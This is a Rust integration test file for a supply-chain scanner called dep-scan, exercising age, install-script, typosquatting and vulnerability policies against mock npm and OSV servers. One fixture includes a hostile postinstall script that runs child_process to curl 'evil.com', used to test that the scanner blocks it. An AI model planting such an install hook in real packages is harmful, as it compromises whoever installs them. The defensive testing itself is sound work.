// SPDX-License-Identifier: Apache-2.0
use std::io::Write;

use assert_cmd::Command;
use predicates::prelude::*;
use serde_json::Value;
use tempfile::{NamedTempFile, TempDir};
use wiremock::matchers::{method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};

/// Build a `Command` for the dep-scan binary.
fn dep_scan() -> Command {
    Command::cargo_bin("dep-scan").expect("binary should exist")
}

/// Write a temporary config file with all v0.2 policies enabled,
/// pointing at the given wiremock npm and OSV URLs.
fn write_v2_config(npm_url: &str, osv_url: &str, cache_path: &str) -> NamedTempFile {
    // Escape backslashes so Windows paths (C:\Users\...) are valid TOML basic
    // strings; on Unix this is a no-op. The escaped path round-trips back to the
    // original value after TOML parsing, so stderr-path assertions still match.
    let cache_path = cache_path.replace('\\', "\\\\");
    let mut f = NamedTempFile::new().expect("create temp config");
    writeln!(
        f,
        r#"
min_package_age_hours = 48
cache_path = "{cache_path}"

[registries]
npm_url = "{npm_url}"

[policies]
check_min_age = true
check_install_scripts = true
check_maintainer_changes = true
check_typosquatting = true
check_vulnerabilities = true
check_npm_provenance = false

[osv]
osv_url = "{osv_url}"

[dependency_confusion]
internal_prefixes = ["internal-", "private-"]
"#
    )
    .expect("write temp config");
    f
}

/// Write a config with specific policy toggles disabled.
fn write_config_with_toggles(
    npm_url: &str,
    osv_url: &str,
    cache_path: &str,
    check_min_age: bool,
    check_install_scripts: bool,
    check_vulnerabilities: bool,
) -> NamedTempFile {
    // Escape backslashes so Windows paths (C:\Users\...) are valid TOML basic
    // strings; on Unix this is a no-op. The escaped path round-trips back to the
    // original value after TOML parsing, so stderr-path assertions still match.
    let cache_path = cache_path.replace('\\', "\\\\");
    let mut f = NamedTempFile::new().expect("create temp config");
    writeln!(
        f,
        r#"
min_package_age_hours = 48
cache_path = "{cache_path}"

[registries]
npm_url = "{npm_url}"

[policies]
check_min_age = {check_min_age}
check_install_scripts = {check_install_scripts}
check_maintainer_changes = true
check_typosquatting = true
check_vulnerabilities = {check_vulnerabilities}
check_npm_provenance = false

[osv]
osv_url = "{osv_url}"

[dependency_confusion]
internal_prefixes = ["internal-", "private-"]
"#
    )
    .expect("write temp config");
    f
}

/// npm JSON response for a package published `hours_ago` hours in the past.
/// Includes no install scripts.
fn npm_json(name: &str, version: &str, hours_ago: i64) -> String {
    let published = chrono::Utc::now() - chrono::TimeDelta::hours(hours_ago);
    let ts = published.to_rfc3339_opts(chrono::SecondsFormat::Millis, true);
    format!(
        r#"{{
    "name": "{name}",
    "description": "A test package",
    "dist-tags": {{ "latest": "{version}" }},
    "versions": {{
        "{version}": {{
            "name": "{name}",
            "version": "{version}",
            "description": "A test package",
            "repository": {{
                "type": "git",
                "url": "git+https://github.com/test/{name}.git"
            }}
        }}
    }},
    "time": {{
        "{version}": "{ts}"
    }},
    "maintainers": [
        {{ "name": "testuser", "email": "test@example.com" }}
    ]
}}"#
    )
}

/// npm JSON response with a malicious postinstall script.
fn npm_json_with_scripts(name: &str, version: &str, hours_ago: i64) -> String {
    let published = chrono::Utc::now() - chrono::TimeDelta::hours(hours_ago);
    let ts = published.to_rfc3339_opts(chrono::SecondsFormat::Millis, true);
    format!(
        r#"{{
    "name": "{name}",
    "description": "A suspicious package",
    "dist-tags": {{ "latest": "{version}" }},
    "versions": {{
        "{version}": {{
            "name": "{name}",
            "version": "{version}",
            "description": "A suspicious package",
            "scripts": {{
                "postinstall": "eval(require('child_process').exec('curl evil.com'))"
            }},
            "repository": {{
                "type": "git",
                "url": "git+https://github.com/test/{name}.git"
            }}
        }}
    }},
    "time": {{
        "{version}": "{ts}"
    }},
    "maintainers": [
        {{ "name": "attacker", "email": "attacker@example.com" }}
    ]
}}"#
    )
}

/// OSV response with a vulnerability.
fn osv_vulnerable_response() -> String {
    serde_json::json!({
        "vulns": [{
            "id": "GHSA-xxxx-yyyy-zzzz",
            "summary": "Critical vulnerability in test package",
            "aliases": ["CVE-2024-1234"],
            "severity": [{
                "type": "CVSS_V3",
                "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
            }],
            "affected": [{
                "package": {"name": "test-pkg", "ecosystem": "npm"},
                "ranges": [{
                    "type": "SEMVER",
                    "events": [
                        {"introduced": "0"},
                        {"fixed": "2.0.0"}
                    ]
                }]
            }]
        }]
    })
    .to_string()
}

/// OSV response with no vulnerabilities.
fn osv_clean_response() -> String {
    "{}".to_string()
}

// =========================================================================
// T-016-01: Multi-policy violations in output
//
// Setup: package published 1h ago (fails age) + OSV returns vulnerability.
// Expected: exit 1, output shows BOTH age BLOCK and vulnerability BLOCK.
// =========================================================================
#[tokio::test]
async fn multi_policy_violations_in_output() {
    let npm_server = MockServer::start().await;
    let osv_server = MockServer::start().await;
    let tmp = TempDir::new().unwrap();
    let cache_path = tmp.path().join("cache.db");
    let config = write_v2_config(
        &npm_server.uri(),
        &osv_server.uri(),
        cache_path.to_str().unwrap(),
    );

    // npm: package published 1h ago (fails 48h age policy)
    Mock::given(method("GET"))
        .and(path("/new-vuln-pkg"))
        .respond_with(ResponseTemplate::new(200).set_body_string(npm_json(
            "new-vuln-pkg",
            "1.0.0",
            1,
        )))
        .mount(&npm_server)
        .await;

    // OSV: returns a vulnerability
    Mock::given(method("POST"))
        .and(path("/v1/query"))
        .respond_with(ResponseTemplate::new(200).set_body_string(osv_vulnerable_response()))
        .mount(&osv_server)
        .await;

    dep_scan()
        .args([
            "--config",
            config.path().to_str().unwrap(),
            "check",
            "new-vuln-pkg",
            "--registry",
            "npm",
        ])
        .assert()
        .code(1)
        // The per-policy breakdown should show both age and vulnerability blocks
        .stdout(predicate::str::contains("age: BLOCK"))
        .stdout(predicate::str::contains("vulnerability: BLOCK"));
}

// =========================================================================
// T-016-02: Suspicious install script blocks
//
// Setup: npm JSON with postinstall containing eval + child_process.
// Expected: exit 1, output mentions install script policy block.
// =========================================================================
#[tokio::test]
async fn suspicious_install_script_blocks() {
    let npm_server = MockServer::start().await;
    let osv_server = MockServer::start().await;
    let tmp = TempDir::new().unwrap();
    let cache_path = tmp.path().join("cache.db");
    let config = write_v2_config(
        &npm_server.uri(),
        &osv_server.uri(),
        cache_path.to_str().unwrap(),
    );

    // npm: package with malicious postinstall script, published 72h ago (passes age)
    Mock::given(method("GET"))
        .and(path("/evil-pkg"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_string(npm_json_with_scripts("evil-pkg", "1.0.0", 72)),
        )
        .mount(&npm_server)
        .await;

    // OSV: clean
    Mock::given(method("POST"))
        .and(path("/v1/query"))
        .respond_with(ResponseTemplate::new(200).set_body_string(osv_clean_response()))
        .mount(&osv_server)
        .await;

    dep_scan()
        .args([
            "--config",
            config.path().to_str().unwrap(),
            "check",
            "evil-pkg",
            "--registry",
            "npm",
        ])
        .assert()
        .code(1)
        .stdout(predicate::str::contains("install_scripts: BLOCK"));
}

// =========================================================================
// T-016-03: Clean package passes all policies
//
// Setup: 72h old package, no vulns, no scripts.
// Expected: exit 0, all policies pass.
// =========================================================================
#[tokio::test]
async fn clean_package_passes_all_policies() {
    let npm_server = MockServer::start().await;
    let osv_server = MockServer::start().await;
    let tmp = TempDir::new().unwrap();
    let cache_path = tmp.path().join("cache.db");
    let config = write_v2_config(
        &npm_server.uri(),
        &osv_server.uri(),
        cache_path.to_str().unwrap(),
    );

    // npm: clean package published 72h ago
    Mock::given(method("GET"))
        .and(path("/clean-pkg"))
        .respond_with(ResponseTemplate::new(200).set_body_string(npm_json(
            "clean-pkg",
            "1.0.0",
            72,
        )))
        .mount(&npm_server)
        .await;

    // OSV: no vulnerabilities
    Mock::given(method("POST"))
        .and(path("/v1/query"))
        .respond_with(ResponseTemplate::new(200).set_body_string(osv_clean_response()))
        .mount(&osv_server)
        .await;

    dep_scan()
        .args([
            "--config",
            config.path().to_str().unwrap(),
            "check",
            "clean-pkg",
            "--registry",
            "npm",
        ])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("age: pass"))
        .stdout(predicate::str::contains("install_scripts: pass"))
        .stdout(predicate::str::contains("vulnerability: pass"));
}

// =========================================================================
// T-016-04: Typosquatting match in output
//
// Package name "reqests" is close to "requests" (normalized Levenshtein
// distance = 1/8 = 0.125, within default warn_threshold of 0.15).
// Expected: output warns about similarity to "requests".
// =========================================================================
#[tokio::test]
async fn typosquatting_match_in_output() {
    let npm_server = MockServer::start().await;
    let osv_server = MockServer::start().await;
    let tmp = TempDir::new().unwrap();
    let cache_path = tmp.path().join("cache.db");
    let config = write_v2_config(
        &npm_server.uri(),
        &osv_server.uri(),
        cache_path.to_str().unwrap(),
    );

    // npm: returns valid metadata for "reqests"
    Mock::given(method("GET"))
        .and(path("/reqests"))
        .respond_with(ResponseTemplate::new(200).set_body_string(npm_json("reqests", "1.0.0", 72)))
        .mount(&npm_server)
        .await;

    // OSV: clean
    Mock::given(method("POST"))
        .and(path("/v1/query"))
        .respond_with(ResponseTemplate::new(200).set_body_string(osv_clean_response()))
        .mount(&osv_server)
        .await;

    dep_scan()
        .args([
            "--config",
            config.path().to_str().unwrap(),
            "check",
            "reqests",
            "--registry",
            "npm",
        ])
        .assert()
        // Exit 1 because typosquatting warn causes has_failure = true
        .code(1)
        .stdout(predicate::str::contains("typosquatting"))
        .stdout(predicate::str::contains("requests"));
}

// =========================================================================
// T-016-05: Config toggle disables policy
//
// Config: check_min_age = false, package is 1h old.
// Expected: no "age" policy in output breakdown. Package may still fail
// other policies but age is not evaluated.
// =========================================================================
#[tokio::test]
async fn config_toggle_disables_policy() {
    let npm_server = MockServer::start().await;
    let osv_server = MockServer::start().await;
    let tmp = TempDir::new().unwrap();
    let cache_path = tmp.path().join("cache.db");
    let config = write_config_with_toggles(
        &npm_server.uri(),
        &osv_server.uri(),
        cache_path.to_str().unwrap(),
        false, // check_min_age = false
        true,  // check_install_scripts
        true,  // check_vulnerabilities
    );

    // npm: 1h old package (would normally fail age, but age is disabled)
    Mock::given(method("GET"))
        .and(path("/new-pkg"))
        .respond_with(ResponseTemplate::new(200).set_body_string(npm_json("new-pkg", "1.0.0", 1)))
        .mount(&npm_server)
        .await;

    // OSV: clean
    Mock::given(method("POST"))
        .and(path("/v1/query"))
        .respond_with(ResponseTemplate::new(200).set_body_string(osv_clean_response()))
        .mount(&osv_server)
        .await;

    let output = dep_scan()
        .args([
            "--config",
            config.path().to_str().unwrap(),
            "check",
            "new-pkg",
            "--registry",
            "npm",
        ])
        .output()
        .expect("run dep-scan");

    let stdout = String::from_utf8(output.stdout).unwrap();

    // The age policy should NOT appear in the output at all
    assert!(
        !stdout.contains("age:"),
        "Age policy should not appear when check_min_age = false, got: {stdout}"
    );

    // Other policies should still be evaluated
    assert!(
        stdout.contains("install_scripts:"),
        "install_scripts policy should still appear, got: {stdout}"
    );
    assert!(
        stdout.contains("vulnerability:"),
        "vulnerability policy should still appear, got: {stdout}"
    );
}

// =========================================================================
// T-016-06: JSON output has stable multi-policy schema
//
// Run with --json and verify each package entry has "policies" array with
// "policy_name", "result", and "reason" fields.
// =========================================================================
#[tokio::test]
async fn json_output_has_stable_multi_policy_schema() {
    let npm_server = MockServer::start().await;
    let osv_server = MockServer::start().await;
    let tmp = TempDir::new().unwrap();
    let cache_path = tmp.path().join("cache.db");
    let config = write_v2_config(
        &npm_server.uri(),
        &osv_server.uri(),
        cache_path.to_str().unwrap(),
    );

    // npm: clean package
    Mock::given(method("GET"))
        .and(path("/schema-pkg"))
        .respond_with(ResponseTemplate::new(200).set_body_string(npm_json(
            "schema-pkg",
            "2.0.0",
            72,
        )))
        .mount(&npm_server)
        .await;

    // OSV: clean
    Mock::given(method("POST"))
        .and(path("/v1/query"))
        .respond_with(ResponseTemplate::new(200).set_body_string(osv_clean_response()))
        .mount(&osv_server)
        .await;

    let output = dep_scan()
        .args([
            "--config",
            config.path().to_str().unwrap(),
            "check",
            "schema-pkg",
            "--registry",
            "npm",
            "--json",
        ])
        .output()
        .expect("run dep-scan");

    assert!(
        output.status.success(),
        "Should exit 0 for clean package, got code {:?}",
        output.status.code()
    );

    let stdout = String::from_utf8(output.stdout).unwrap();
    let parsed: Value = serde_json::from_str(&stdout).expect("output should be valid JSON");

    let arr = parsed.as_array().expect("should be a JSON array");
    assert_eq!(arr.len(), 1);

    let entry = &arr[0];
    assert_eq!(entry["package"], "schema-pkg");
    assert_eq!(entry["version"], "2.0.0");
    assert_eq!(entry["registry"], "npm");
    assert_eq!(entry["result"], "pass");

    // Verify the policies array structure
    let policies = entry["policies"]
        .as_array()
        .expect("should have policies array");
    assert!(
        !policies.is_empty(),
        "policies array should not be empty when all policies are enabled"
    );

    // Every policy entry must have policy_name (string), result (string), reason (string or null)
    for policy in policies {
        assert!(
            policy["policy_name"].is_string(),
            "policy_name should be a string, got: {:?}",
            policy["policy_name"]
        );
        let result = policy["result"]
            .as_str()
            .expect("result should be a string");
        assert!(
            result == "pass" || result == "warn" || result == "block",
            "result should be pass/warn/block, got: {result}"
        );
        // reason should be either a string or null
        assert!(
            policy["reason"].is_null() || policy["reason"].is_string(),
            "reason should be null or string, got: {:?}",
            policy["reason"]
        );
    }

    // Verify specific policy names are present
    let policy_names: Vec<&str> = policies
        .iter()
        .filter_map(|p| p["policy_name"].as_str())
        .collect();
    assert!(
        policy_names.contains(&"age"),
        "Should contain age policy, got: {:?}",
        policy_names
    );
    assert!(
        policy_names.contains(&"install_scripts"),
        "Should contain install_scripts policy, got: {:?}",
        policy_names
    );
    assert!(
        policy_names.contains(&"vulnerability"),
        "Should contain vulnerability policy, got: {:?}",
        policy_names
    );
    assert!(
        policy_names.contains(&"typosquatting"),
        "Should contain typosquatting policy, got: {:?}",
        policy_names
    );
}

// =========================================================================
// T-016-07: Exit codes with multi-policy
//
// Package passes age (72h old) but has vulnerability from OSV.
// Expected: exit 1 (worst result wins).
// =========================================================================
#[tokio::test]
async fn exit_codes_with_multi_policy() {
    let npm_server = MockServer::start().await;
    let osv_server = MockServer::start().await;
    let tmp = TempDir::new().unwrap();
    let cache_path = tmp.path().join("cache.db");
    let config = write_v2_config(
        &npm_server.uri(),
        &osv_server.uri(),
        cache_path.to_str().unwrap(),
    );

    // npm: old package (passes age)
    Mock::given(method("GET"))
        .and(path("/vuln-only-pkg"))
        .respond_with(ResponseTemplate::new(200).set_body_string(npm_json(
            "vuln-only-pkg",
            "1.0.0",
            72,
        )))
        .mount(&npm_server)
        .await;

    // OSV: returns vulnerability (blocks)
    Mock::given(method("POST"))
        .and(path("/v1/query"))
        .respond_with(ResponseTemplate::new(200).set_body_string(osv_vulnerable_response()))
        .mount(&osv_server)
        .await;

    dep_scan()
        .args([
            "--config",
            config.path().to_str().unwrap(),
            "check",
            "vuln-only-pkg",
            "--registry",
            "npm",
        ])
        .assert()
        .code(1)
        // Age should pass, vulnerability should block
        .stdout(predicate::str::contains("age: pass"))
        .stdout(predicate::str::contains("vulnerability: BLOCK"))
        .stdout(predicate::str::contains("GHSA-xxxx-yyyy-zzzz"));
}
